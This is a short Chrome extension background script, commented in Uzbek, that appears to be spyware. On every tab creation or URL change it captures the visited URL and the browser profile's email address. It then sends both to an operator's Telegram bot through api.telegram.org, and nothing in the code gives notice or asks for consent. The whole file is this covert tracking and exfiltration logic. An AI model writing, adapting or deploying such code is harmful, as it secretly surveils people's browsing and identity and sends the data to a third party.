// O'zingizning Telegram bot tokeningizni shu yerga yozing
const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
// O'zingizning chat_id (user yoki group ID) ni yozing
const CHAT_ID = "YOUR_CHAT_ID";

// Tab o'zgarganda
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url) {
    logWithEmail(changeInfo.url);
  }
});

// Yangi tab ochilganda
chrome.tabs.onCreated.addListener((tab) => {
  if (tab.pendingUrl) {
    logWithEmail(tab.pendingUrl);
  }
});

// Foydalanuvchi emailini olish va Telegramga yuborish
function logWithEmail(url) {
  chrome.identity.getProfileUserInfo((userInfo) => {
    const email = userInfo.email || "Email not available";
    const message = `🌐 New URL opened:\n${url}\n👤 User: ${email}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      }),
    }).catch(err => console.error("Telegram error:", err));
  });
}

